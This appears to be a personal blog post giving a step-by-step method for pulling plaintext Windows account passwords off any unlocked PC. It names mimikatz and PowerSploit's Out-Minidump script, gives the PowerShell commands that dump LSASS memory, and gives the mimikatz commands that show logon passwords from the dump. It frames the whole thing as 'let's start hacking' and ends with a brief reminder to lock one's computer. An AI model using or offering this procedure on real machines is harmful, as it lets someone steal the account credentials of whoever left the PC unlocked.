---
layout: post
title: Getting plaintext Windows passwords on unlocked PC
description: A simple how-to article demonstrating existing vulnerability that makes your Windows passwords are hackable.
tags: [Windows, Password, Vulnerability]
comments: true
---

I found [this article](http://www.fixedbyvonnie.com/2015/02/hack-passwords-of-windows-in-5-minutes) mentioning the existing vulnerability in Windows PC where you can the plaintext view of your passwords on unlocked computer. So, I tried it on my Windows 10 PC and found that the vulnerability is still there. The method used here is not new at all, and anyone can perform this hacking on any unlocked Windows PC.



### Tools you need

- [mimikatz](https://github.com/gentilkiwi/mimikatz/releases/latest) - just get the binary package, e.g. `mimikatz_trunk.zip`
- [Out-Minidump.ps1](https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1) - PowerShell script

Download all those tools and let's start hacking!



### 1. Perform memory dump using the PowerShell script

To perform the [LSASS](https://technet.microsoft.com/en-us/library/cc961760.aspx) dump, we will use the PowerShell script - `Out-Minidump.ps1`. The flow of cmdlet will look like this:

{% include figure.html src="assets/images/1lQnyhZ.png" caption="PowerShell cmdlet" %}

```powershell
. 'G:\USERFILES\Desktop\PowerShell Playground\Out-Minidump.ps1'
# "dot sourcing" method to import function from the script

Get-Process lsass | Out-Minidump
# To perform the LSASS dump

Copy-Item .\lsass_868.dmp 'G:\USERFILES\Desktop\PowerShell Playground'
# Copy the dump file to desired location
```

### 2. View the passwords using the mimikatz terminal program

As you can see, `lsass_868.dmp` is the example of LSASS dump file captured using the PowerShell script. Now, it's time we use the mimikatz terminal to load in the dump file as follows:

```
sekurlsa::minidump "G:\USERFILES\Desktop\PowerShell Playground\lsass_868.dmp"
```

{% include figure.html src="assets/images/OPA0g0w.png" caption="mimikatz MINIDUMP" %}

Switching to MINIDUMP file, so now we can view the passwords. Now, run this command to display all the accounts and passwords available:

```
sekurlsa::logonPasswords full
```

Voila! Now, you can see your actual Microsoft Account username and password in _a plaintext view_.

{% include figure.html src="assets/images/nWPZUIR.jpg" caption="mimikatz logonPasswords" %}



### The vulnerability explanation

The fact is that the password is encrypted but it's useless as the implementation depends on two basic Win32 functions; [LsaProtectMemory](https://msdn.microsoft.com/en-us/library/windows/desktop/ff714509%28v=vs.85%29.aspx) (the encryption function) and [LsaUnprotectMemory](https://msdn.microsoft.com/en-us/library/windows/desktop/ff714510(v=vs.85).aspx) (the decryption function). And Windows stores encrypted user passwords in memory without using one-way hash which is decryptable using **LsaUnprotectMemory** function to a plain text.



Do not forget to lock your Windows when you leave your desk!